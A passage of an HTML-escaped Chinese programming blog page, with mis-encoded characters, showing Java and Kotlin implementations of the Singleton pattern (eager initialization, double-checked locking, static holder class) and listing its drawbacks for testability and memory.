&lt;h3 id="å®ç°">å®ç°&lt;/h3>
&lt;h4 id="é¥¿æ±‰å¼">é¥¿æ±‰å¼&lt;/h4>
&lt;!--list-separator-->
&lt;ul>
&lt;li>
&lt;p>Java å®ç°&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">class&lt;/span> &lt;span class="nc">Singleton&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">public&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">static&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Singleton&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">getInstance&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">return&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// ...&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">private&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">Singleton&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">private&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">static&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Singleton&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">new&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Singleton&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;!--list-separator-->
&lt;ul>
&lt;li>
&lt;p>Kotlin å®ç°&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-kotlin" data-lang="kotlin">&lt;span class="line">&lt;span class="cl">&lt;span class="k">object&lt;/span> &lt;span class="nc">Singleton&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// ...
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h4 id="åŒé‡æ£€æŸ¥é”--double-checked-locking">åŒé‡æ£€æŸ¥é” (Double-checked locking)&lt;/h4>
&lt;!--list-separator-->
&lt;ul>
&lt;li>
&lt;p>Java å®ç°&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">class&lt;/span> &lt;span class="nc">Singleton&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">public&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">static&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Singleton&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">getInstance&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">null&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">synchronized&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Singleton&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">class&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">null&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">new&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Singleton&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">return&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">private&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">Singleton&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">private&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">volatile&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">static&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Singleton&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;!--list-separator-->
&lt;ul>
&lt;li>
&lt;p>Kotlin å®ç°&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-kotlin" data-lang="kotlin">&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">Singleton&lt;/span> &lt;span class="k">private&lt;/span> &lt;span class="k">constructor&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">companion&lt;/span> &lt;span class="k">object&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">val&lt;/span> &lt;span class="py">instance&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Singleton&lt;/span> &lt;span class="k">by&lt;/span> &lt;span class="n">lazy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mode&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nc">LazyThreadSafetyMode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SYNCHRONIZED&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Singleton&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h4 id="é™æ€å†…éƒ¨ç±»">é™æ€å†…éƒ¨ç±»&lt;/h4>
&lt;p>è¿™ç§æ–¹å¼åˆ©ç”¨ Java è™šæ‹Ÿæœºçš„ç±»åŠ è½½æœºåˆ¶æ¥å®ç°æ‡’åŠ è½½çš„æ•ˆæœï¼Œå¹¶å¤„ç†åŒæ­¥é”çš„é—®é¢˜ã€‚&lt;/p>
&lt;!--list-separator-->
&lt;ul>
&lt;li>
&lt;p>Java å®ç°&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">class&lt;/span> &lt;span class="nc">Singleton&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">public&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">static&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Singleton&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">getInstance&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">return&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Holder&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">instance&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">public&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">static&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">hello&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">out&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;hello&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">static&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">out&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Singleton has been loaded!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">private&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">Singleton&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">private&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">static&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">class&lt;/span> &lt;span class="nc">Holder&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">static&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">out&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Holder has been loaded!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">static&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">final&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Singleton&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">new&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Singleton&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">public&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">static&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">String&lt;/span>&lt;span class="o">[]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Singleton&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">hello&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// ä¸‹é¢è¿™å¥ä¼šè§¦å‘ Holder çš„åŠ è½½ï¼Œè¿›è€Œè§¦å‘ instance çš„åˆå§‹åŒ–&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Singleton&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">getInstance&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;!--list-separator-->
&lt;ul>
&lt;li>
&lt;p>Kotlin å®ç°&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-kotlin" data-lang="kotlin">&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">Singleton&lt;/span> &lt;span class="k">private&lt;/span> &lt;span class="k">constructor&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">companion&lt;/span> &lt;span class="k">object&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">init&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Singleton has been loaded!&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">val&lt;/span> &lt;span class="py">instance&lt;/span> &lt;span class="k">get&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nc">Holder&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">instance&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">fun&lt;/span> &lt;span class="nf">hello&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;hello&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">private&lt;/span> &lt;span class="k">object&lt;/span> &lt;span class="nc">Holder&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">init&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Holder has been loaded!&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">val&lt;/span> &lt;span class="py">instance&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">Singleton&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nc">Singleton&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">hello&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// ä¸‹é¢è¿™å¥ä¼šè§¦å‘ Holder çš„åŠ è½½ï¼Œè¿›è€Œè§¦å‘ instance çš„åˆå§‹åŒ–
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nc">Singleton&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">instance&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="åŠ£åŠ¿">åŠ£åŠ¿&lt;/h3>
&lt;ul>
&lt;li>ä»å¯æµ‹è¯•æ€§çš„è§’åº¦ï¼Œåº”è¯¥å°½é‡å‡å°‘ Singleton çš„ä½¿ç”¨ã€‚å› ä¸º Singleton éš¾ä»¥è¢« mockã€‚å¯ä»¥è€ƒè™‘ç”¨&lt;a href="https://mincodes.com/posts/design-patterns-creational/#%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82--abstract-factory">æŠ½è±¡å·¥å‚ (Abstract Factory)&lt;/a>æ¥ä»£æ›¿ Singleton, å¹¶åœ¨å·¥å‚å†…éƒ¨è¿”å›å…¶å”¯ä¸€å®ä¾‹ã€‚&lt;/li>
&lt;li>ç”±äºå•ä¾‹å¯¹è±¡æ— æ³•è¢«åƒåœ¾å›æ”¶ï¼Œä¼šå¯¼è‡´éƒ¨åˆ†å†…å­˜æˆ–å…¶ä»–èµ„æºé•¿æœŸè¢«å æ®ã€‚å¦‚æœå•ä¾‹æ˜¯ä¸€ä¸ªå ç”¨è¾ƒå¤šèµ„æºçš„å¤æ‚å¯¹è±¡ï¼Œè¿™å¯èƒ½ä¼šé€ æˆèµ„æºç´§å¼ çš„é—®é¢˜ã€‚&lt;/li>
